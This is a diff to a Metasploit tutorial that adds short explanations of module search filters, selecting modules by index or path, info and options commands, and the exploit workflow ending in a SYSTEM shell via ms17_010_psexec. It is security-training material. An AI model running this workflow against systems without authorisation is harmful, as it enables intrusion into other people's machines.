@@ -63,6 +63,7 @@ Metasploit modules are prepared scripts with specific purposes and functions tha
 ```bash
 msf6 > help search
 ```
+> Shows all available search keywords and syntax options.
 
 ### Search Keywords
 
@@ -106,6 +107,7 @@ msf6 > search type:exploit platform:windows cve:2021 rank:excellent microsoft
 # Exclude results (prepend with -)
 msf6 > search cve:2009 type:exploit platform:-linux
 ```
+> Chain multiple keywords and filters in one search. Prefix a filter value with `-` to exclude it. Results are numbered — use the index with `use 0` to select without typing the full path.
 
 ---
 
@@ -120,18 +122,21 @@ msf6 > search ms17_010
 msf6 > use 0
 # Selects module #0 from search results — no need to type the full path
 ```
+> Index numbers from `search` results are temporary — they reset after the next search. Select the module immediately after searching.
 
 ### Select by Full Path
 
 ```bash
 msf6 > use exploit/windows/smb/ms17_010_psexec
 ```
+> Full paths never become stale — unlike index numbers, they work after any search. Use tab-completion to avoid typos.
 
 ### View Module Info
 
 ```bash
 msf6 exploit(windows/smb/ms17_010_psexec) > info
 ```
+> Shows authors, CVE references, available targets, required options, and a full description. Always read this before running an unfamiliar module.
 
 This shows:
 - Name, platform, architecture, rank
@@ -150,6 +155,7 @@ This shows:
 ```bash
 msf6 exploit(windows/smb/ms17_010_psexec) > options
 ```
+> Lists all configurable settings. The `Required` column shows what must be set before running. Everything marked `Yes` with no current value will cause the module to fail.
 
 > Everything with `Yes` in the **Required** column must be set before running the exploit.
 
@@ -204,6 +210,7 @@ meterpreter > shell
 C:\Windows\system32> whoami
 nt authority\system
 ```
+> This is the standard exploit workflow: scan → search → select → options → set required values → run. Use `setg LHOST` for your attacker IP so it persists when switching modules. The `meterpreter > shell` command drops into a native OS shell.
 
 ### What Happened Behind the Scenes
 
